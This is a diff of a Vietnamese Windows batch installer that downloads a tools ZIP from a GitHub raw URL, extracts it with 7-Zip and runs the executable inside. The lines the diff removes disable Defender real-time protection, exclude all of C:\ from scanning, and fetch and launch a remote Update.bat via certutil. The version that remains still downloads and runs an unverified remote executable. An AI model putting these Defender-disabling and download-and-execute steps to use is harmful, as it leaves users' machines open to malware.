@@ -9,7 +9,7 @@ mode con cols=80 lines=25
 :: Căn giữa màn hình bằng WinAPI qua PowerShell (đÃ sửa $h=$r.Bottom-$r.Top)
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool GetWindowRect(IntPtr hWnd,out RECT lpRect);[DllImport(\"user32.dll\")]public static extern bool MoveWindow(IntPtr hWnd,int X,int Y,int W,int H,bool Repaint);public struct RECT{public int Left;public int Top;public int Right;public int Bottom;}' -Name Win32 -Namespace Native; Add-Type -AssemblyName System.Windows.Forms; $hWnd=[Native.Win32]::GetConsoleWindow(); $r=New-Object Native.Win32+RECT; [Native.Win32]::GetWindowRect($hWnd,[ref]$r) | Out-Null; $w=[int]($r.Right-$r.Left); $h=[int]($r.Bottom-$r.Top); $sw=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $sh=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $x=[int](($sw-$w)/2); $y=[int](($sh-$h)/2); [Native.Win32]::MoveWindow($hWnd,$x,$y,$w,$h,$true)"
 
-title Tat tam thoi Windows Defender + Tai file GitHub + Giai nen ZIP
+title CAP NHAT TOOLS SETUP WINDOWS
 color 0A
 
 REM =============== KIỂM TRA INTERNET (ping 8.8.8.8) ===============
@@ -46,30 +46,8 @@ set "DESKTOP=%USERPROFILE%\Desktop"
 set "TARGETDIR=%DESKTOP%\Tools Windows Setup"
 set "FILE2=%TARGETDIR%\Tools_Windows_Setup.zip"
 set "FILE3=%TARGETDIR%\Tools_Windows_Setup.exe"
-set "FILE1=%TARGETDIR%\Update.bat"
 set "EXE_7z_x64=%TEMP%\7z2301-x64.exe"
 set "EXE_7z_x32=%TEMP%\7z2301.exe"
-
-:: ========================
-:: TẮT TẠM THỜI DEFENDER (Win10+; Win7/8 try/catch)
-:: ========================
-echo Dang tat tam thoi Windows Defender Real-Time Protection...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}"
-powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath 'C:\' } catch {}"
-
-rem --- Thêm ngoại lệ ---
-powershell -NoP -Ep Bypass -C ^
- "Try { Add-MpPreference -ExclusionPath '%TARGETDIR%'; Add-MpPreference -ExclusionProcess '%FILE3%'; exit 0 } Catch { Write-Host $_.Exception.Message; exit 1 }"
-set RC=%ERRORLEVEL%
-powershell -NoP -Ep Bypass -C ^
- "Try { Add-MpPreference -ExclusionPath '%TARGETDIR%'; Add-MpPreference -ExclusionProcess '%FILE1%'; exit 0 } Catch { Write-Host $_.Exception.Message; exit 1 }"
-set RC=%ERRORLEVEL%
-
-echo Da gui lenh tat tam thoi (neu that bai, van tiep tuc).
-echo.
-
-
-set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Update.bat"
 set "URL_ZIP=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.zip"
 set "URL_EXE_7z_x64=https://www.7-zip.org/a/7z2301-x64.exe"
 set "URL_EXE_7z_x32=https://www.7-zip.org/a/7z2301.exe"
@@ -80,7 +58,7 @@ if not exist "%TARGETDIR%" (
 )
 
 :: Xoá file cũ nếu tồn tại
-if exist "%FILE1%" (echo [i] Xoa file cu: Update.bat & del /f /q "%FILE1%")
+taskkill /im Tools_Windows_Setup.exe /f /t >nul 2>&1
 if exist "%FILE2%" (echo [i] Xoa file cu: Tools_Windows_Setup.zip & del /f /q "%FILE2%")
 if exist "%FILE3%" (echo [i] Xoa file cu: Tools_Windows_Setup.exe & del /f /q "%FILE3%")
 
@@ -88,13 +66,6 @@ if exist "%FILE3%" (echo [i] Xoa file cu: Tools_Windows_Setup.exe & del /f /q "%
 :: TẢI FILE (WebClient + TLS1.2)
 :: ========================
 
-REM =============== TẢI Update.bat ===============
-echo Dang tai Update.bat ...
-certutil -urlcache -split -f "%URL_BAT%" "%FILE1%" >nul 2>&1
-if exist "%FILE1%" goto DL1_OK
-echo [-] Loi tai Update.bat
-goto END
-:DL1_OK
 
 REM =============== TẢI ZIP vào STAGING ===============
 echo Dang tai Tools_Windows_Setup.zip ...
@@ -126,9 +97,12 @@ echo .....................................
 echo Dang tien hanh giai nen . . .
 echo .....................................
 echo Giai nen thanh cong vao: "%TARGETDIR%"
-timeout /t 5 /nobreak >nul
+echo .....................................
+timeout /t 2 /nobreak >nul
+echo Dang mo chuong trinh: Tools_Windows_Setup.exe
+echo .....................................
 start "" "%FILE3%"
-start "" "%FILE1%"
+timeout /t 5 /nobreak >nul
 echo.
 
 
@@ -139,7 +113,7 @@ endlocal
 exit /b
 
 
-REM ======================= HÀM: ĐẢM BẢO 7-ZIP (TẢI 5 BƯỚC) ==========================
+REM ======================= HÀM: ĐẢM BẢO 7-ZIP ==========================
 :ENSURE_7ZIP
 set "_7ZEXE="
 call :FIND_7Z
@@ -200,17 +174,6 @@ attrib -r -s -h "%_OUT%\*" /s /d >nul 2>&1
 if errorlevel 1 exit /b 1
 exit /b 0
 
-goto :OPEN_UPDATE
-
-:FOUND_EXE_LABEL
-echo [*] Mo: "%FOUND_EXE%"
-start "" "%FOUND_EXE%"
-
-:OPEN_UPDATE
-if exist "%FILE1%" (
-  echo [*] Mo: "%FILE1%"
-  start "" "%FILE1%"
-)
 
 :END
 echo.
